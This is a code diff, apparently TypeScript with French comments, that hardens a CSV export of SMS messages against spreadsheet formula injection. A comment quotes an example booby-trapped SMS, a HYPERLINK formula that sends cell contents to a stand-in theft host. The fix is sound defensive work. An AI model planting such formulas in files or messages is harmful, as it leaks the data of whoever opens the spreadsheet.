@@ -16,10 +16,18 @@ export const dynamic = "force-dynamic";
 const JOURS_DEFAUT = 7;
 const JOURS_MAX = 90;
 
-// Un champ CSV : entouré de guillemets dès qu'il contient le séparateur,
-// un guillemet ou un saut de ligne — le texte d'un SMS peut tout contenir.
+// Un champ CSV. Deux protections :
+//   1. le texte d'un SMS peut tout contenir — on l'entoure de guillemets dès
+//      qu'il porte le séparateur, un guillemet ou un saut de ligne ;
+//   2. surtout, un tableur voit une cellule qui commence par « = + - @ »
+//      (ou une tabulation) comme une FORMULE. Un SMS piégé
+//      « =HYPERLINK("http://vol.example"&A1,"clic") » s'exécuterait alors à
+//      l'ouverture du bilan dans Excel, dans le compte du propriétaire.
+//      On désamorce en préfixant ces cellules d'une apostrophe : le tableur
+//      l'affiche comme du texte, la valeur reste lisible.
 function champ(v: string | number | null): string {
-  const s = v == null ? "" : String(v);
+  let s = v == null ? "" : String(v);
+  if (/^[=+\-@\t\r]/.test(s)) s = `'${s}`;
   return /[";\n\r]/.test(s) ? `"${s.replace(/"/g, '""')}"` : s;
 }
 
